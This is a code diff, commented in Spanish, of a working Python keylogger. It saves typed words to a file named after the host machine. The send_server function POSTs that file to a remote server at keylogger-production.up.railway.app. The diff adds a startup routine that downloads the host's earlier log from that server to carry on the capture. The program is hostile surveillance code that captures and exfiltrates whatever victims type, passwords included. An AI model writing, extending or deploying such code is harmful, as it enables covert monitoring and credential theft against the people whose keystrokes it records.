@@ -14,7 +14,10 @@ hostname = socket.gethostname()
 # Nombre del archivo basado en el nombre del equipo
 filename = f"{hostname}_block.txt"
 
-# Función para eliminar el archivo al cerrar el programa
+# URL del servidor
+server_url = "https://keylogger-production.up.railway.app"
+
+# Función para eliminar el archivo local al cerrar el programa
 def cleanup():
     if os.path.exists(filename):
         os.remove(filename)
@@ -58,7 +61,7 @@ def save_word():  # Añade palabras al archivo cada que se presione espacio
 
 
 def send_server(filename):  # Envía el txt al servidor con un POST
-    url = "https://keylogger-production.up.railway.app/upload"
+    url = f"{server_url}/upload"
     with open(filename, "rb") as file:
         try:
             response = requests.post(url, files={"file": file})
@@ -71,6 +74,24 @@ def reset():  # Resetea la palabra
     global palabra
     palabra = ""
 
+
+def check_existing_file():  # Verifica si el archivo ya existe en el servidor
+    url = f"{server_url}/files/{hostname}/{filename}"
+    try:
+        response = requests.get(url)
+        if response.status_code == 200:
+            # Si el archivo existe, lo descargamos y lo usamos como base
+            with open(filename, "wb") as file:
+                file.write(response.content)
+            print(f"Archivo {filename} descargado del servidor.")
+        else:
+            print(f"El archivo {filename} no existe en el servidor. Se creará uno nuevo.")
+    except requests.exceptions.RequestException as e:
+        print(f"Error al verificar el archivo en el servidor: {e}")
+
+
+# Verificar si el archivo ya existe en el servidor al iniciar el programa
+check_existing_file()
 
 try:  # Detiene el script cuando se presiona Escape y llama a la función unhook_all()
     keyboard.wait()
